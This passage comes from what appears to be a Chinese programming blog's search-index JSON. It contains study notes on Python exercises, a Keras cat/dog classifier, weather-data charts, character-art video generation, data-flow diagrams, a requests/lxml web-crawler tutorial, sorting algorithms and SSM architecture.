float(input(&#x27;请输入成绩: &#x27;))if score &gt;= 90: grade = &#x27;A&#x27;elif score &gt;= 80: grade = &#x27;B&#x27;elif score &gt;= 70: grade = &#x27;C&#x27;elif score &gt;= 60: grade = &#x27;D&#x27;else: grade = &#x27;E&#x27;print(&#x27;对应的等级是:&#x27;, grade) 6:输入三条边长，如果能构成三角形就计算周长和面积。1234567891011a = float(input(&#x27;a = &#x27;))b = float(input(&#x27;b = &#x27;))c = float(input(&#x27;c = &#x27;))if a + b &gt; c and a + c &gt; b and b + c &gt; a: print(&#x27;周长: %f&#x27; % (a + b + c)) p = (a + b + c) / 2 area = (p * (p - a) * (p - b) * (p - c)) ** 0.5 print(&#x27;面积: %f&#x27; % (area))else: print(&#x27;不能构成三角形&#x27;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# # 1.# sum = 0# for i in range(0, 101):# sum += i# print(sum)# # 2.# sum = 0# while 1:# for i in range(1,100,2):# print(i)# sum += i# break# print(sum)# # 3.# n = int(input(&#x27;请输入一个小于10的整数：&#x27;))# result = 1# if n &lt; 10 and n !=0:# while 1:# result *= n# n -= 1# if n == 1:# break# print(result)# else:# print(&#x27;输入不合法，请重新输入！！&#x27;)# n = int(input(&#x27;请输入一个小于10的整数：&#x27;))# result = 1# if n &lt; 10 and n !=0:# for i in range(0,n+1):# result *= n# n -= 1# if n == 1:# break# print(result)# else:# print(&#x27;输入不合法，请重新输入！！&#x27;)# # 4.# sum = 0# for i in range(0, 101):# if i % 3 == 0 and i % 5 != 0:# #print(i)# sum +=i# print(sum)# 1368# # 5.cock公鸡 hen母鸡 小鸡chick# cock = 0# hen = 0# for cock in range(1, 101):# for hen in range(1, 101):# chick = 100 - cock - hen# if (chick // 3 + cock * 3 + hen * 2) ==100 and chick % 3 == 0:# print(cock,hen,chick)# # 6.# male = 0# female = 0# for male in range(36):# for female in range(36):# child = 36 - male - female# if (male * 4 + female * 3 + child * 0.5) == 36:# print(male, female, child)# # 7.# for i in range(1000,10000):# cd = i%100# ab = (i-i%100)/100# if (ab+cd)**2 ==i:# print(i)# 2025# 3025# 9801# # 8.# n=int(input(&quot;请输入一个整数:&quot;))# for i in range(n):# print(&quot; &quot;*(n-i-1),end=&#x27;&#x27;)# print(&quot; *&quot;*(2*i+1))# # 9.# for i in range(1,10):# for j in range(1,i+1):# print(j,&#x27;*&#x27;,i,&#x27;=&#x27;,i*j,end=&#x27; &#x27;)# print()# 1 * 1 = 1# 1 * 2 = 2 2 * 2 = 4# 1 * 3 = 3 2 * 3 = 6 3 * 3 = 9# 1 * 4 = 4 2 * 4 = 8 3 * 4 = 12 4 * 4 = 16# 1 * 5 = 5 2 * 5 = 10 3 * 5 = 15 4 * 5 = 20 5 * 5 = 25# 1 * 6 = 6 2 * 6 = 12 3 * 6 = 18 4 * 6 = 24 5 * 6 = 30 6 * 6 = 36# 1 * 7 = 7 2 * 7 = 14 3 * 7 = 21 4 * 7 = 28 5 * 7 = 35 6 * 7 = 42 7 * 7 = 49# 1 * 8 = 8 2 * 8 = 16 3 * 8 = 24 4 * 8 = 32 5 * 8 = 40 6 * 8 = 48 7 * 8 = 56 8 * 8 = 64# 1 * 9 = 9 2 * 9 = 18 3 * 9 = 27 4 * 9 = 36 5 * 9 = 45 6 * 9 = 54 7 * 9 = 63 8 * 9 = 72 9 * 9 = 81# 10.# for i in range(100, 1000):# if (i // 100) ** 3 + (((i % 100 - i % 10)) / 10) ** 3 + (i % 10) ** 3 == i:# print(i)# 153# 370# 371# 407# 11.# number = int(input(&quot;请输入一个整数：&quot;))# sum = 0# n = number# while n:# left = n % 10# n = n // 10# sum +=left# print(str(number) + &quot;的各位数的和为：&quot; + str(sum))# 12.# n = int(input(&quot;请输入一个整数：&quot;))# for i in range(2, int(n ** 0.5)):# if n % i == 0:# print(n, &quot;不是质数&quot;)# else:# print(n, &quot;是质数&quot;)# n = int(input(&quot;请输入一个整数：&quot;))# if n &gt; 1:# for i in range(2, n):# if (n % i) == 0:# print(n, &#x27;不是质数&#x27;)# break# else:# print(n, &quot;是质数&quot;)# else:# print(&#x27;不是质数&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"神经网络实现猫狗识别笔记","slug":"神经网络实现猫狗识别","date":"2020-06-20T03:13:28.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/20/神经网络实现猫狗识别/","permalink":"http://example.com/2020/06/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%AE%9E%E7%8E%B0%E7%8C%AB%E7%8B%97%E8%AF%86%E5%88%AB/","excerpt":"神经网络实现猫狗识别","text":"神经网络实现猫狗识别 神经网络实现猫狗识别 卷积神经网络 卷积 12341. 就是一种运算，是一种矩阵降维的运算2. 为了解决卷积运算中，中心元素的运算比重远大于边缘元素的情况，补白 补白可以降低中间元素参与运算的比重。3. 步长 池化 12341. 最大池化层： 选取一个过滤器去过滤出一个区域的最大值2. 平均池化层 选取一个过滤器去过滤出一个区域的平均值 AlexNet1234567891011121314151617181920227 * 227 * 31. 卷积池化层 卷积：96个卷积核，卷积核大小11 * 11 * 3，步长为4，补白为0 池化：最大池化层，过滤器的大小是3 * 3 ，步长为22. 卷积池化层 卷积：256个卷积核，卷积核大小5 * 5 * 3，步长为1，补白为2 池化：最大池化层，过滤器大小3 * 3 ，步长为23. 卷积层 卷积：384个卷积核，卷积核大小3 * 3 * 3 ，步长为1，补白为14. 卷积层 卷积：384个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为15. 卷积池化层 卷积：256个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 池化：最大池化层，过滤器大小3 * 3，步长为26. 全连接层 4096个神经元，激活函数ReLu7. 全连接层 4096个神经元，激活函数ReLu8. 全连接层 2个神经元 Keras1Keras本身是封装了TensorFlow的一个高阶框架，支持快速实验。 123安装，如果安装了TensorFlow，在安装keras的时候可能会出错，把TensorFlow都有东西全部删除。直接pip install keras就可以了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# @Time : 2020/6/15 8:34 # @Author : XX# @File : 猫狗识别.py # @Software: PyCharmimport osimport cv2import numpy as npfrom keras.models import Sequentialfrom keras.layers import Conv2D,MaxPool2D,Dense,Flattenfrom keras.utils import np_utilsimport keras.losses as losses# 1. 读取数据def load_datas(dir_path): # 构建特征矩阵和目标向量 datas = [] y = [] for image_name in os.listdir(dir_path): # 读取图片,构建特征矩阵 datas.append(cv2.resize(cv2.imread(os.path.join(dir_path, image_name)),(227,227))) # 构建目标向量 if image_name.split(&#x27;.&#x27;)[0]==&#x27;cat&#x27;: y.append(1) else: y.append(0) # 对y进行独热(ont-hot)编码 # y = np_utils.to_categorical(y) return np.array(datas),np.array(y)def create_model(X,Y): # 1. 构建一个序列模型(空壳) # 卷积层：filters：卷积核个数，kernel_size卷积核大小，strides步长，padding补白 # 池化层：pool_size过滤器大小，strides步长 # 全连接层Dense：units神经元个数，activation激活函数 model = Sequential() # 1. 卷积池化层 # 卷积：96个卷积核，卷积核大小11 * 11 * 3，步长为4，补白为0 model.add(Conv2D(filters=96,kernel_size=(11,11),strides=(4,4))) # 池化：最大池化层，过滤器的大小是3 * 3 ，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 2. 卷积池化层 # 卷积：256个卷积核，卷积核大小5 * 5 * 3，步长为1，补白为2 model.add(Conv2D(filters=256,kernel_size=(5,5),padding=&#x27;same&#x27;)) # 池化：最大池化层，过滤器大小3 * 3 ，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 3. 卷积层 # 卷积：384个卷积核，卷积核大小3 * 3 * 3 ，步长为1，补白为1 model.add(Conv2D(filters=384,kernel_size=(3,3))) # 4. 卷积层 # 卷积：384个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 model.add(Conv2D(filters=384,kernel_size=(3,3))) # 5. 卷积池化层 # 卷积：256个卷积核，卷积核大小3 * 3 * 3，步长为1，补白为1 model.add(Conv2D(filters=256,kernel_size=(3,3))) # 池化：最大池化层，过滤器大小3 * 3，步长为2 model.add(MaxPool2D(pool_size=(3,3),strides=(2,2))) # 6. 全连接层 # 4096个神经元，激活函数ReLu model.add(Flatten()) model.add(Dense(units=4096,activation=&#x27;relu&#x27;)) # 7. 全连接层 # 4096个神经元，激活函数ReLu model.add(Dense(units=4096, activation=&#x27;relu&#x27;)) # 8. 全连接层 # 2个神经元,激活函数使用sigmoid或者softmax model.add(Dense(units=2, activation=&#x27;softmax&#x27;)) # 对模型进行编译 model.compile(optimizer=&#x27;adam&#x27;,loss=&#x27;sparse_categorical_crossentropy&#x27;,metrics=[&#x27;accuracy&#x27;]) model.fit(X,Y,epochs=50)if __name__ == &#x27;__main__&#x27;: # 不要用中文路径！！！！！ dir_path = r&#x27;G:\\AI\\kaggle\\train2&#x27; X,Y = load_datas(dir_path) X = X/255 create_model(X,Y)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"数据可视化分析笔记","slug":"数据可视化分析","date":"2020-06-20T03:08:50.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/06/20/数据可视化分析/","permalink":"http://example.com/2020/06/20/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E5%88%86%E6%9E%90/","excerpt":"","text":"数据可视化分析12345天气预报-根据拿到的每天的天气情况来绘制可视化图表。爬虫-拿天气数据-从哪儿拿？（哪个地方没有反爬我们就去哪儿拿）S获得到数据之后，使用正则表达式筛选数据 12345678数据可视化分析，是基于数据的值进行可视化分析的一种手段，我们可以根据可视化中展示的数据，得到一些结论，比如数据是否有明显的趋势、数据的分布是否符合高斯分布(数据的一个体现)数据的平稳性(数据分析首先对数据进行平稳性分析) 如果是平稳性数据需要分析的时候需要采用： AR MA ARMA 如果是非平稳性数据分析需要采用： ARIMA 项目要求采集数据，并且合理的将数据生成HTML进行数据可视化展示。要求组内每个人都需要至少生成三张图表不限制一定要天气数据。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# _*_coding:UTF-8 _*_# 推荐安装pyecharts1.6.0# pip install pyecharts==1.6.0# 如果使用pycharm安装，settings中project中 project interpreter点击，# 点击右方加号，搜索pyecharts点击install即可。# 如果要指定版本，勾选右下方specify version，选择1.6.0# 然后在点击install package# 如果安装成功后，发现版本不对，卸载重装# 卸载:pip uninstall pyechartsimport requestsimport re #正则表达式import jsonfrom pyecharts.charts import Barfrom pyecharts import options as optsurl1 = &#x27;http://www.weather.com.cn/weather1d/101010100.shtml&#x27;# 北京url2 = &#x27;http://www.weather.com.cn/weather1d/101020100.shtml&#x27;# 上海url3 = &#x27;http://www.weather.com.cn/weather1d/101100101.shtml&#x27;# 太原def get_data(url): res = requests.get(url=url) text = res.content.decode(&#x27;utf-8&#x27;) # print(text) r1 = re.findall(&#x27;hour3data=(.*?&#125;)&#x27;, text) r2 = r1[0] # 使用json把字符串转为字典 r3 = json.loads(r2) today = r3[&#x27;7d&#x27;][0] return todaytoday1 = get_data(url1)# 北京温度today2 = get_data(url2)# 上海温度today3 = get_data(url3)# 太原温度# print([i.split(&#x27;,&#x27;)[3] for i in today1])c = (Bar() .add_xaxis([i.split(&#x27;,&#x27;)[0] for i in today1]) .add_yaxis(&#x27;北京温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today1])# 北京 .add_yaxis(&#x27;上海温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today2])# 上海 .add_yaxis(&#x27;太原温度&#x27;,[int(i.split(&#x27;,&#x27;)[3].strip(&#x27;℃&#x27;)) for i in today3])# 太原 .set_global_opts(title_opts=opts.TitleOpts(title=&#x27;各城市当天温度&#x27;), toolbox_opts=opts.TitleOpts) )c.render(&#x27;1.html&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"线性回归和逻辑回归学习笔记","slug":"线性回归和逻辑回归学习笔记","date":"2020-06-16T14:42:40.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/16/线性回归和逻辑回归学习笔记/","permalink":"http://example.com/2020/06/16/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E5%92%8C%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"python 机器学习 机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测","text":"python 机器学习 机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测 12机器学习利用大量的数据样本，使得计算机通过不断的学习获得一个模型，用来对新的未知数据做预测 机器学习有监督学习（分类、回归）同时将数据样本和标签输入给模型，模型学习到数据和标签的映射关系，从而对新数据进行预测 无监督学习（聚类）只有数据，没有标签，模型通过总结规律，从数据中挖掘出信息。 强化学习强化学习会在没有任何标签的情况下，通过先尝试做出一些行为得到一个结果，通过这个结果是对还是错的反馈，调整之前的行为，就这样不断的调整，算法能够学习到在什么样的情况下选择什么样的行为可以得到最好的结果 线性回归1利用大量的样本，通过有监督的学习，学习到由x到y的映射f ff，利用该映射关系对未知的数据进行预估，因为y为连续值，所以是回归问题。 逻辑回归123456789监督学习，解决二分类问题。监督学习，解决二分类问题。分类的本质：在空间中找到一个决策边界来完成分类的决策逻辑回归：线性回归可以预测连续值，但是不能解决分类问题，我们需要根据预测的结果判定其属于正类还是负类。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"Python字符串视频的生成笔记","slug":"Python字符串视频的生成","date":"2020-06-11T13:18:32.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/06/11/Python字符串视频的生成/","permalink":"http://example.com/2020/06/11/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%86%E9%A2%91%E7%9A%84%E7%94%9F%E6%88%90/","excerpt":"给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。","text":"给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。 字符串视频的生成1给一个完整的视频，对视频进行处理，达到：生成一个新的视频，用自己想要的字符串来代替视频中的原有元素。 思路123451. open-cv视频处理库 pip install opencv-python2. 先把视频里面每一帧的图片都抽取出来3. 把每一帧的图片都给处理成字符串组成的新图片4. 新的图片给组合成一个新的视频。 读取视频12345678910111213141516171819202122232425262728# _*_coding:UTF-8 _*_&#x27;&#x27;&#x27;1. open-cv视频处理库 pip install opencv-python2. 先把视频里面每一帧的图片都抽取出来3. 把每一帧的图片都给处理成字符串组成的新图片4. 新的图片给组合成一个新的视频。&#x27;&#x27;&#x27;# CV2不支持中文，任何中文路径都会报错import cv2# 打开一个视频流,方法中需要传一个参数，默认无参，表示打开摄像头。vidcap = cv2.VideoCapture(r&#x27;G:\\CV\\video\\video.avi&#x27;)# print(vidcap.read()) # .read()方法返回两个值：1.读取状态2. 视频里图片的元素 三通道图片RGBsuccess = True# count为计数器，主要为了对图片进行排序count = 0while success: # 读取视频的内容，返回读取状态和当前帧内容（当前帧是一个三通道的图片） success,image = vidcap.read() # print(success) 程序终止 # 把当前帧图片写入到文件夹中 cv2.imwrite(r&#x27;G:\\CV\\pic\\%d.jpg&#x27;%count,image) #记录顺序，并命名%d.jpg count += 1# 一定会报错，会在最后一次，读取最后一帧，超过最后一帧的时候，会报错。 处理视频图片为字符串图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# _*_coding:UTF-8 _*_from PIL import Image,ImageDraw,ImageFontimport osimport cv2&#x27;&#x27;&#x27;Cpython基于C编写，GIL锁，目的是为了防止脏读脏读：无效数据的读出，是指在数据库访问中，事务T1将某一值修改，然后事务T2读取该值，此后T1因为某种原因撤销对该值的修改，这就导致了T2所读取到的数据是无效的，值得注意的是，脏读一般是针对于update操作的。&#x27;&#x27;&#x27;def draw(pic): # 读取在上一个程序中保存下来的截图 # 有时候PIL和CV2他不支持反斜杠，需要将反斜杠换为斜杠 # 现在读出来的图片，虽然是三通道，但不是RGB，而是BGR img = cv2.imread(&#x27;G:\\CV\\strVideo\\pic\\%s&#x27;%pic) # print(img) # 把读出来的数据BGR换为RGB # 读出来的每一张图片都是三维数据，[图片长，图片宽，通道值] img = img[:,:,(2,1,0)] #切第三维，原本为BGR（0，1，2），需改为RGB（2，1，0） # print(img) # 创建一个新的空白画布,如果最后color值不传或者为None则默认为黑色填充 blank = Image.new(&quot;RGB&quot;,[len(img[0]),len(img)],&quot;white&quot;) # 创建一个新画布，可以在给定图像上进行绘图,需要给定要在哪个图像上进行绘图 drawOBJ = ImageDraw.Draw(blank) n = 10 # 规定要使用的字体,并且规范字号 font = ImageFont.truetype(r&#x27;C:\\Windows\\Fonts\\Microsoft YaHei UI\\msyhbd.ttc&#x27;,size=n-1) # 需要遍历新图像的每个像素点 for i in range(0,len(img),n): #注意步长n for j in range(0,len(img[i]),n): text = &#x27;人智真棒&#x27; #重新替换所有元素 drawOBJ.ink = img[i][j][0]+img[i][j][1] * 256 + img[i][j][2]*256*256 drawOBJ.text([j,i],text[int(j/n) % len(text)],font=font) # 保存图片，第一个参数为路径，第二个参数为保存格式 print(i,j) # 保存图片，第一个为路径，第二个为保存格式 blank.save(&#x27;new/new_&#x27;+pic,&#x27;jpeg&#x27;)# 获取到传入路径下的所有文件名filelist = os.listdir(r&#x27;G:\\CV\\strVideo\\pic&#x27;)for file in filelist: draw(file)# print(filelist) 将新图片组成新的视频1234567891011121314151617181920212223242526272829303132333435363738394041424344# _*_coding:UTF-8 _*_import osimport cv2# 排序def resort(list): for i in range(len(list)-1): #len(list)-1后面取不到 for j in range(len(list)-1): # print(list[j+1].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]) 先用&quot;.&quot;分，生成列表new_0，在用&quot;_&quot;分 # 冒泡排序 这里需要注意转成整型在比较，原来为字符串 # 字符串比较的时候是按位数比较 if int(list[j].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]) &gt; int(list[j+1].split(&#x27;.&#x27;)[0].split(&#x27;_&#x27;)[1]): list[j],list[j+1] = list[j+1],list[j] return listfilelist = os.listdir(r&#x27;G:\\CV\\strVideo\\new&#x27;)filelist = resort(filelist)# fps=频率，指的是每秒钟显示多少张照片fps = 24# 图片的分辨率 高 × 宽# 规定导出的文件名file_path = r&#x27;G:\\CV\\strVideo\\video\\new_video.avi&#x27;# 规定导出的格式fourcc = cv2.VideoWriter_fourcc(&#x27;I&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;0&#x27;)# 规定视频流编码# 不同视频编码对应不同视频格式（例：&#x27;I&#x27;,&#x27;4&#x27;,&#x27;2&#x27;,&#x27;0&#x27; 对应avi格式）# fourcc = cv2.VideoWriter_fourcc(&#x27;D&#x27;, &#x27;I&#x27;, &#x27;V&#x27;, &#x27;X&#x27;) #mp4格式# 创建写入视频对象，需要规范输出文件路径、编码格式、fps以及图片分辨率# 相当于创建一个视频，但是该视频为空# video = cv2.VideoWriter(file_path,fourcc,fps,size) size是相反的video = cv2.VideoWriter(file_path,fourcc,fps,(960,540)) #需要特别注意分辨率问题# 遍历图片往视频里面写for item in filelist: item = os.path.join(r&#x27;G:\\CV\\strVideo\\new&#x27;, item) #文件名和图片名拼接一起 # print(item) 显示拼接后的路径 # 读取图片内容 img = cv2.imread(item) print(img) # 相当于向视频中一帧一帧的添加图片 video.write(img)video.release() #释放video资源","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"软件需求工程---数据流图","slug":"软件需求工程-数据流图","date":"2020-06-09T07:28:28.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/09/软件需求工程-数据流图/","permalink":"http://example.com/2020/06/09/%E8%BD%AF%E4%BB%B6%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%9B%BE/","excerpt":"软件需求工程—数据流图","text":"软件需求工程—数据流图 软件需求工程—数据流图1234567891011121314151617数据流图**是过程建模所使用的主要建模技术，它在建模时所使用的基本模型元素有4种：**外部实体、过程、数据流和数据存储**。最终建立的数据流图会以图形的方式表现出来，它的表示法有两种：**DeMarco-Yourdon**表示法和**Gane-Sarson**表示在DeMarco-Yourdon表示法，外部实体使用**矩形**来加以描述，在Gane-Sarson表示法中，外部实体使用**双矩形**或矩形来加以描述。**过程**是指施加与数据的动作或行为，它们使数据发生变化，包括被转换、被存储或被分布。数据流是数据的运动，它是系统与其环境之间或者系统内两个过程之间的通信形式。**外部实体**是指处于待构建系统之外的人、组织、设备或其他软件系统，他们不受系统的控制，开发者不能以任何方式操纵人们。在数据流图中需要进行建模的外部实体是那些和待构建的软件系统之间存在着数据交互的外部实体，它们从待构建软件系统中获取数据或者为待构建软件系统提供数据，即它们是待构建系统的数据源或数据目的地。所有的外部实体联合起来构成了软件系统的外部上下文环境，它们与软件系统的交互流就是软件系统与其外部环境的接口，这些接口联合起来定义了软件系统的系统边界。对软件系统功能分析就是从系统的边界出发逐步深入的。**数据流**是数据的运动，它是系统与其环境之间或者系统内两个过程之间的通信形式。数据流图的数据流是必须和过程产生关联的，它要么是过程的数据输入，要么是过程的数据输出。**数据存储**是软件系统需要在内部收集、保存，以供日后使用的数据集合。如果说数据流描述的是运动的数据，那么数据存储描述的就是静止的数据。数据流图使用外部实体、过程、数据流和数据存储这4个元素来构建系统的过程模型，描述系统的功能、行为和数据。 过程是对数据的处理，必须是有输入，也必须有输出； 数据流是必须和过程产生关联的，它要么是过程的数据输入，要么是过程的数据输出。 数据流图中所有的对象都应该有一个可以唯一标示自己的名称。 在分层结构中定义了3个层次的数据流图：上下文图、0层图和N层图。数据流图层次结构的建立主要包括以下几个步骤：1创建上下文图2发现并建立DFC片段3根据数据流图片段组合产生0层图4对0层图的过程进行功能分解，产生N层图。以上步骤往往需要不断的反复。","categories":[],"tags":[{"name":"需求工程","slug":"需求工程","permalink":"http://example.com/tags/%E9%9C%80%E6%B1%82%E5%B7%A5%E7%A8%8B/"}]},{"title":"爬虫学习笔记","slug":"爬虫学习笔记","date":"2020-06-09T07:07:53.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/06/09/爬虫学习笔记/","permalink":"http://example.com/2020/06/09/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"爬虫学习笔记请求与响应","text":"爬虫学习笔记请求与响应 爬虫学习笔记请求与响应爬虫：crawler、网络机器人、网络蚂蚁、网络蜘蛛、spider 1. 通用爬虫 主要用于搜索引擎，谷歌、百度、360、搜狗、必应等等..... 目的在于尽可能多的搜集互联网上的高质量数据 优点：数量大且全 缺点：有价值的数据比较少，硬件成本太高。pagerank 2. 聚焦爬虫： 也成为主题爬虫（最常用的爬虫） 要按照预先设定好的主题，有选择性的进行网页爬取。 主要用于特定信息的获取。 优点：节省资源，数据价值较高。 3. 增量式爬虫 是一种特殊的聚焦爬虫，只采集更新后的数据 每次爬取只爬取更新后的页面（一天、一周、一月） 123456789101112 2. ## 协定约束 在首页/IP后面加上/robots.txt可以看到君子协定。3. ## 库 ```markdown 1. urllib 最基础的，python自带的一个http请求库 2. requests 基于urllib进行了封装，是一个第三方库 pip install requests 3. scrapy 协程级的异步框架4. scrapy-redis 基于scrapy和redis出现的分布式爬虫框架 5. aiohttp...... HTTP的主要请求 1234561. GET请求：向服务器请求资源 get请求可以携带参数，参数携带方式以在url后面以问号拼接的形式携带2. POST请求：向服务器请求资源 1. post请求可以携带参数，通过表单提交，post的请求的参数一般是加密的。3. PUT请求：请求服务器存储一个资源4. DELETE请求：请求服务器删除一个资源。 爬虫程序思路 1. 发送get请求 res = requests.get() res.text 如果出现乱码，查找网页中的网页编码方式，进行解码在编码 res.content.decode() 2. 如何解析响应 1. 正则 2. BS 3. lxml 第三方类库，效率快，可以解析html和xml pip install lxml pip install -i https://pypi.tuna.tsinghua.edu.cn/simple lxml 如何更新pip pip install --upgrade pip 可以使用xpath语法来获取数据 1. 基本语法： //:从根目录开始获取 @属性名：获取属性值 /表示从当前对象开始获取 []：筛选元素 2. 内置函数 text() 12345678910111213141516171819202122232425262728### 案例```pythonimport requestsfrom lxml import etreeurl = &#x27;http://www.xbiquge.la/xiaoshuodaquan/&#x27;res = requests.get(url=url)ele = etree.HTML(res.text)bookurl = ele.xpath(&quot;//div[@class=&#x27;novellist&#x27;]/ul/li/a/@href&quot;)for url in bookurl: res = requests.get(url=url) txt = res.content.decode(&#x27;utf-8&#x27;) ele = etree.HTML(txt) content_url = ele.xpath(&quot;//div[@id=&#x27;list&#x27;]/dl/dd/a/@href&quot;) for u in content_url: res = requests.get(url = &#x27;http://www.xbiquge.la&#x27;+u) # pycharm的输出有长度限制，实际上正文已经获取到了，但是pycharm不显示 content = res.content.decode(&#x27;utf-8&#x27;) ele = etree.HTML(content) c = ele.xpath(&quot;//div[@id=&#x27;content&#x27;]/text()&quot;) print(c) s = &#x27;&#x27; for cc in c: s+= cc s = s.strip() with open(&#x27;牧神记.txt&#x27;,&#x27;a+&#x27;,encoding=&#x27;utf-8&#x27;) as w: w.write(s+&#x27;\\n&#x27;+&#x27;\\n&#x27;+&#x27;\\n&#x27;)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"python 实现冒泡排序和选择排序","slug":"python 实现冒泡排序和选择排序","date":"2020-06-08T09:45:53.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/06/08/python 实现冒泡排序和选择排序/","permalink":"http://example.com/2020/06/08/python%20%E5%AE%9E%E7%8E%B0%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E5%92%8C%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/","excerpt":"python 实现冒泡排序,选择排序,插入排序","text":"python 实现冒泡排序,选择排序,插入排序 python 实现冒泡排序和选择排序冒泡排序： 比较相邻的元素。如果第一个比第二个大，就交换他们两个。 对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。 针对所有的元素重复以上的步骤，除了最后一个。 持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。 1234567891011121314151617181920212223import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 从小到大for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &gt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a)# 从大到小for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &lt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a) 选择排序：对比数组中前一个元素跟后一个元素的大小，如果后面的元素比前面的元素小则用一个变量k来记住他的位置，接着第二次比较，前面“后一个元素”现变成了“前一个元素”，继续跟他的“后一个元素”进行比较如果后面的元素比他要小则用变量k记住它在数组中的位置(下标)，等到循环结束的时候，我们应该找到了最小的那个数的下标了，然后进行判断，如果这个元素的下标不是第一个元素的下标，就让第一个元素跟他交换一下值，这样就找到整个数组中最小的数了。然后找到数组中第二小的数，让他跟数组中第二个元素交换一下值，以此类推。 1234567891011121314151617import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)for i in range(len(a)): # 找一个最小值的下标 min = i for j in range(i+1,len(a)): if a[min] &gt; a[j]: min = j a[min], a[i] = a[i], a[min]print(&#x27;排序后：&#x27;,a) 插入排序 思想：现在已经有一个有序的序列了，要求在这个已经的数据序列中，再插入一个数 插入排序是将序列分为两部分，最开始的时候第一个数就是一个有序部分，剩下的部分为无序部分，每次取无序部分中的第一个数和无序部分进行比较，放入到有序部分中的合适的位置 [65,27,59,64,58] [65] [27,59,64,58] [65] [27,59,64,58] -&gt; [27,65] [59,64,58] -&gt; [27,65] [64,58] 12345678910111213141516171819import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 取无序部分的第一个元素，和有序部分进行比较，放在合适的位置# [65,27,59,64,58]# [20,27,59,65,65,,20]for i in range(len(a) - 1): for j in range(i + 1, 0, -1): if a[j] &lt; a[j - 1]: a[j], a[j - 1] = a[j - 1], a[j] else: breakprint(&#x27;排序后：&#x27;, a)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"SSM框架web系统思路","slug":"SSM框架web系统","date":"2020-05-22T09:45:53.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/05/22/SSM框架web系统/","permalink":"http://example.com/2020/05/22/SSM%E6%A1%86%E6%9E%B6web%E7%B3%BB%E7%BB%9F/","excerpt":"系统架构设计","text":"系统架构设计 SSM框架web系统思路 系统架构设计1.持久对象层(也称持久层或持久化层):该层由若干持久化类(实体类)组成 2.数据访问层( DAO 层):该层由若干 DAO 接口和 MyBatis 映射文件组成 接口的名称统一以 Dao 结尾，且 MyBatis 的映射文件名称要与接口的名称相同 3.业务逻辑层( Service 层):该层由若干 Service 接口和实现类组成 在本系统中，业务逻辑层的接口统一使用 Service 结尾，其实现类名称统一在接口名后加 Impl 该层主要用于实现系统的业务逻辑 4.Web 表现层:该层主要包括 